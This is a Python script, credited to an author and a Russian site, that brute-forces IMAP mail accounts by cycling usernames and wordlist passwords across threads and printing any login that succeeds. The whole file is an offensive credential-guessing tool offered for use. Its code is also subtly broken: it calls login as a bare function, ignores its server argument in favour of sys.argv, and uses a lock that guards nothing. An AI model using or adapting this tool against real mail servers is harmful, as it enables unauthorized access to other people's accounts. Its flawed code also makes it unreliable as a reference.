# -*- coding: utf-8 -*-
# Coded by Mine_Bit[BrainHands]
# brainhands.ru
# mine_bit@brainhands.ru

import threading
import time
import random
import sys
import imaplib
import socket
from imaplib import IMAP4
from copy import copy


def Start(server_in, userlist_in, wordlist_in):
    try:
        users = open(userlist_in, "r").readlines()
    except(IOError):
        print('Error: Check your userlist path')
        sys.exit(1)

    try:
        words = open(wordlist_in, "r").readlines()
    except(IOError):
        print('Error: Check your wordlist path')
    print('Параметры:')
    print('[+] Server:', server_in);
    print('[+] Users Loaded:', len(users))
    print('[+] Words Loaded:', len(words))

    wordlist = copy(words)


    def reloader():
        for word in wordlist:
            words.append(word)


    def getword():
        lock = threading.Lock()
        lock.acquire()
        if len(words) != 0:
            value = random.sample(words, 1)
            words.remove(value[0])
        else:
            print('Reloading Wordlist - Changing User')
            reloader()
            value = random.sample(words, 1)
            users.remove(users[0])

        lock.release()
        if len(users) == 1:
            return value[0][:-1], users[0]
        else:
            return value[0][:-1], users[0][:-1]


    class Worker(threading.Thread):
        def run(self):
            value, user = getword()
            try:
                print('-' * 12)
                print('User:', user, 'Password:', value)
                M = imaplib.IMAP4(sys.argv[1])
                M = login(user, value)
                print('Login successful:', user, value)
                M.close()
                M.logout()
                work.join()
                sys.exit(2)
            except(IMAP4.error, socket.gaierror, socket.error, socket.herror) as msg:
                print('An error occurred: ', msg)
                pass

    for i in range(len(words) * len(users)):
        work = Worker()
        work.start()
        time.sleep(1)
